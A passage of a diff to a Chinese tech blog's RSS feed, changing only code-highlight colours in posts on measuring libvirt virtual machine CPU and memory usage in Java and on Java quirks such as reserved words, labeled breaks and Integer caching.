+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">// t秒前的CPU时间&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd">long&lt;/span> c1 &lt;span style="color:#ff79c6">=&lt;/span> domain.&lt;span style="color:#50fa7b">getInfo&lt;/span>().&lt;span style="color:#50fa7b">cpuTime&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Thread.&lt;span style="color:#50fa7b">sleep&lt;/span>(1000);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">// 当前CPU时间&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd">long&lt;/span> c2 &lt;span style="color:#ff79c6">=&lt;/span> domain.&lt;span style="color:#50fa7b">getInfo&lt;/span>().&lt;span style="color:#50fa7b">cpuTime&lt;/span>;
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 虚拟CPU数量&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> vCpus &lt;span style="color:#f92672">=&lt;/span> domain.&lt;span style="color:#a6e22e">getMaxVcpus&lt;/span>();
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// t 为1秒&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Double cpuUsage &lt;span style="color:#f92672">=&lt;/span> 100 &lt;span style="color:#f92672">*&lt;/span> (c2 &lt;span style="color:#f92672">-&lt;/span> c1) &lt;span style="color:#f92672">/&lt;/span> (1 &lt;span style="color:#f92672">*&lt;/span> vCpus &lt;span style="color:#f92672">*&lt;/span> Math.&lt;span style="color:#a6e22e">pow&lt;/span>(10, 9));
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>log.&lt;span style="color:#a6e22e">debug&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;虚拟机[{}]CPU使用率为: {}&amp;#34;&lt;/span>, uuid, cpuUsage);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">// 虚拟CPU数量&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd">int&lt;/span> vCpus &lt;span style="color:#ff79c6">=&lt;/span> domain.&lt;span style="color:#50fa7b">getMaxVcpus&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">// t 为1秒&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Double cpuUsage &lt;span style="color:#ff79c6">=&lt;/span> 100 &lt;span style="color:#ff79c6">*&lt;/span> (c2 &lt;span style="color:#ff79c6">-&lt;/span> c1) &lt;span style="color:#ff79c6">/&lt;/span> (1 &lt;span style="color:#ff79c6">*&lt;/span> vCpus &lt;span style="color:#ff79c6">*&lt;/span> Math.&lt;span style="color:#50fa7b">pow&lt;/span>(10, 9));
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>log.&lt;span style="color:#50fa7b">debug&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;虚拟机[{}]CPU使用率为: {}&amp;#34;&lt;/span>, uuid, cpuUsage);
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="内存使用率">内存使用率&lt;/h3>
 &lt;p>不要使用&lt;code>domain.getInfo()&lt;/code>返回的 &lt;code>memory&lt;/code>字段，虽然它注释写的是&lt;code>the memory in KBytes used by the domain&lt;/code>，但它的意思真的不是虚拟机内部进程已使用的内存大小，而是从宿主机器的角度来看分配给这个虚拟机的内存它使用了多少，如果没有特殊配置，它会和&lt;code>maxMem&lt;/code>字段的值是相同的。&lt;/p>
 &lt;p>正确做法是使用&lt;code>domain.memoryStats(10)&lt;/code>来获取，那为什么参数要输入一个&lt;code>10&lt;/code>呢？这是因为&lt;code>10&lt;/code>代表的是要返回的信息数量，经过我手动执行&lt;code>virsh dommemstat uuid&lt;/code> 测试发现有10个参数返回，所以需要填入&lt;code>10&lt;/code>。另外命令返回的&lt;code>unused&lt;/code> 字段值与数组中&lt;code>tag=8&lt;/code>的数据一致，最终我们获取到了未使用的内存大小，计算内存使用率更是轻轻松松。&lt;/p>
 &lt;p>Java代码如下&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>MemoryStatistic&lt;span style="color:#f92672">[]&lt;/span> memoryStatistics &lt;span style="color:#f92672">=&lt;/span> domain.&lt;span style="color:#a6e22e">memoryStats&lt;/span>(10);
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Optional&lt;span style="color:#f92672">&amp;lt;&lt;/span>MemoryStatistic&lt;span style="color:#f92672">&amp;gt;&lt;/span> first &lt;span style="color:#f92672">=&lt;/span> Arrays.&lt;span style="color:#a6e22e">stream&lt;/span>(memoryStatistics).&lt;span style="color:#a6e22e">filter&lt;/span>(x &lt;span style="color:#f92672">-&amp;gt;&lt;/span> x.&lt;span style="color:#a6e22e">getTag&lt;/span>() &lt;span style="color:#f92672">==&lt;/span> 8).&lt;span style="color:#a6e22e">findFirst&lt;/span>();
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (first.&lt;span style="color:#a6e22e">isPresent&lt;/span>()) {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> MemoryStatistic memoryStatistic &lt;span style="color:#f92672">=&lt;/span> first.&lt;span style="color:#a6e22e">get&lt;/span>();
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">long&lt;/span> unusedMemory &lt;span style="color:#f92672">=&lt;/span> memoryStatistic.&lt;span style="color:#a6e22e">getValue&lt;/span>();
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">long&lt;/span> maxMemory &lt;span style="color:#f92672">=&lt;/span> domain.&lt;span style="color:#a6e22e">getMaxMemory&lt;/span>();
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">double&lt;/span> memoryUsage &lt;span style="color:#f92672">=&lt;/span> (maxMemory &lt;span style="color:#f92672">-&lt;/span> unusedMemory) &lt;span style="color:#f92672">*&lt;/span> 100.&lt;span style="color:#a6e22e">0&lt;/span> &lt;span style="color:#f92672">/&lt;/span> maxMemory;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> log.&lt;span style="color:#a6e22e">debug&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;虚拟机[{}]内存使用率为: {}&amp;#34;&lt;/span>, uuid, memoryUsage);
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>MemoryStatistic&lt;span style="color:#ff79c6">[]&lt;/span> memoryStatistics &lt;span style="color:#ff79c6">=&lt;/span> domain.&lt;span style="color:#50fa7b">memoryStats&lt;/span>(10);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Optional&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>MemoryStatistic&lt;span style="color:#ff79c6">&amp;gt;&lt;/span> first &lt;span style="color:#ff79c6">=&lt;/span> Arrays.&lt;span style="color:#50fa7b">stream&lt;/span>(memoryStatistics).&lt;span style="color:#50fa7b">filter&lt;/span>(x &lt;span style="color:#ff79c6">-&amp;gt;&lt;/span> x.&lt;span style="color:#50fa7b">getTag&lt;/span>() &lt;span style="color:#ff79c6">==&lt;/span> 8).&lt;span style="color:#50fa7b">findFirst&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">if&lt;/span> (first.&lt;span style="color:#50fa7b">isPresent&lt;/span>()) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> MemoryStatistic memoryStatistic &lt;span style="color:#ff79c6">=&lt;/span> first.&lt;span style="color:#50fa7b">get&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd">long&lt;/span> unusedMemory &lt;span style="color:#ff79c6">=&lt;/span> memoryStatistic.&lt;span style="color:#50fa7b">getValue&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd">long&lt;/span> maxMemory &lt;span style="color:#ff79c6">=&lt;/span> domain.&lt;span style="color:#50fa7b">getMaxMemory&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd">double&lt;/span> memoryUsage &lt;span style="color:#ff79c6">=&lt;/span> (maxMemory &lt;span style="color:#ff79c6">-&lt;/span> unusedMemory) &lt;span style="color:#ff79c6">*&lt;/span> 100.&lt;span style="color:#50fa7b">0&lt;/span> &lt;span style="color:#ff79c6">/&lt;/span> maxMemory;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> log.&lt;span style="color:#50fa7b">debug&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;虚拟机[{}]内存使用率为: {}&amp;#34;&lt;/span>, uuid, memoryUsage);
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="网卡数据包信息">网卡数据包信息&lt;/h3>
 &lt;p>同样&lt;code>libvirt&lt;/code>并没有提供获取虚拟机网卡的接口，因此需要获取虚拟机的xml文件来查询。&lt;/p></description></item><item><title>Java的奇技淫巧</title><link>https://www.typesafe.cn/posts/java-unexpected-features/</link><pubDate>Sat, 13 Mar 2021 13:49:38 +0800</pubDate><guid>https://www.typesafe.cn/posts/java-unexpected-features/</guid><description>&lt;p>&lt;strong>Java&lt;/strong>是一种广泛使用的计算机编程语言、面向对象、泛型编程的特性，广泛应用于企业级Web应用开发和移动应用开发。&lt;/p>
 &lt;p>1995年3月23日&lt;strong>Sun&lt;/strong>公司发布了&lt;strong>Java&lt;/strong>，至今已有近26年，可以说是一门十分成熟的开发语言了，但在某些不为人知的地方存在着一些意料之外的特性。&lt;/p>
 &lt;h3 id="java的保留关键字-goto和const">Java的保留关键字 goto和const&lt;/h3>
 &lt;p>在&lt;strong>Java&lt;/strong>里面没有&lt;code>goto&lt;/code>这个功能，但它作为保留字是无法当做变量来使用的，&lt;code>const&lt;/code>也是同样。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#66d9ef">goto&lt;/span> &lt;span style="color:#f92672">=&lt;/span> 0;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#f92672">=&lt;/span> 0;
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd">int&lt;/span> &lt;span style="color:#ff79c6">goto&lt;/span> &lt;span style="color:#ff79c6">=&lt;/span> 0;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd">int&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">const&lt;/span> &lt;span style="color:#ff79c6">=&lt;/span> 0;
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>上面这两行代码的写法存在问题，无法正常编译通过。&lt;/p>
 &lt;h3 id="java标签label">Java标签Label&lt;/h3>
 &lt;p>上面说了在&lt;strong>Java&lt;/strong>里面没有&lt;code>goto&lt;/code>这个功能，但为了处理多重循环引入了Label，目的是为了在多重循环中方便的使用 break 和coutinue ，但好像在其他地方也可以用。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>outerLoop:
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">while&lt;/span> (&lt;span style="color:#66d9ef">true&lt;/span>) {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;I&amp;#39;m the outer loop&amp;#34;&lt;/span>);
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> 0;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">while&lt;/span> (&lt;span style="color:#66d9ef">true&lt;/span>) {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;I am the inner loop&amp;#34;&lt;/span>);
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		i&lt;span style="color:#f92672">++&lt;/span>;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">if&lt;/span> (i &lt;span style="color:#f92672">&amp;gt;=&lt;/span> 3) {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span> outerLoop;
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">outerLoop&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">while&lt;/span> (&lt;span style="color:#ff79c6">true&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;I&amp;#39;m the outer loop&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#8be9fd">int&lt;/span> i &lt;span style="color:#ff79c6">=&lt;/span> 0;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#ff79c6">while&lt;/span> (&lt;span style="color:#ff79c6">true&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;I am the inner loop&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		i&lt;span style="color:#ff79c6">++&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#ff79c6">if&lt;/span> (i &lt;span style="color:#ff79c6">&amp;gt;=&lt;/span> 3) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#ff79c6">break&lt;/span> outerLoop;
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		}
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Complete the loop&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;Complete the loop&amp;#34;&lt;/span>);
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 输出&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>m the outer loop
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">// 输出&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I&amp;#39;m the outer loop
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I am the inner loop
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I am the inner loop
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I am the inner loop
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Complete the loop
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>test:
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">test&lt;/span>:
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;hello&amp;#34;&lt;/span>);
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">true&lt;/span>) {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span> test; &lt;span style="color:#75715e">// works&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;hello&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#ff79c6">if&lt;/span> (&lt;span style="color:#ff79c6">true&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">break&lt;/span> test; &lt;span style="color:#6272a4">// works&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;world&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;world&amp;#34;&lt;/span>);
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 输出&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">// 输出&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>hello
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>test:
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">true&lt;/span>) {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;hello&amp;#34;&lt;/span>);
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">true&lt;/span>) {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">break&lt;/span> test; &lt;span style="color:#75715e">// works&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">test&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">if&lt;/span> (&lt;span style="color:#ff79c6">true&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;hello&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#ff79c6">if&lt;/span> (&lt;span style="color:#ff79c6">true&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#ff79c6">break&lt;/span> test; &lt;span style="color:#6272a4">// works&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;world&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;world&amp;#34;&lt;/span>);
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 输出&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">// 输出&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>hello
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>test:
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">try&lt;/span> {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;hello&amp;#34;&lt;/span>);
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">true&lt;/span>) {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">break&lt;/span> test; &lt;span style="color:#75715e">// works&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">test&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">try&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;hello&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#ff79c6">if&lt;/span> (&lt;span style="color:#ff79c6">true&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#ff79c6">break&lt;/span> test; &lt;span style="color:#6272a4">// works&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;world&amp;#34;&lt;/span>);
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} &lt;span style="color:#66d9ef">finally&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;world&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} &lt;span style="color:#ff79c6">finally&lt;/span> {
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 输出&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">// 输出&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>hello
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="integer的是否相等问题">Integer的是否相等问题&lt;/h3>
 &lt;p>日常开发使用到Java基本数据类型是不可避免的一件事，但它却包含了一些很容易犯错的点，踩过一些坑的同学可能了解Java基本包装类型的常量池技术，例如&lt;code>Integer&lt;/code>就具有数值&lt;code>[-128，127] &lt;/code>的相应类型的缓存数据，但下面定义的4个变量是否相等你是否能说的出来呢？&lt;/p></description></item></channel></rss>
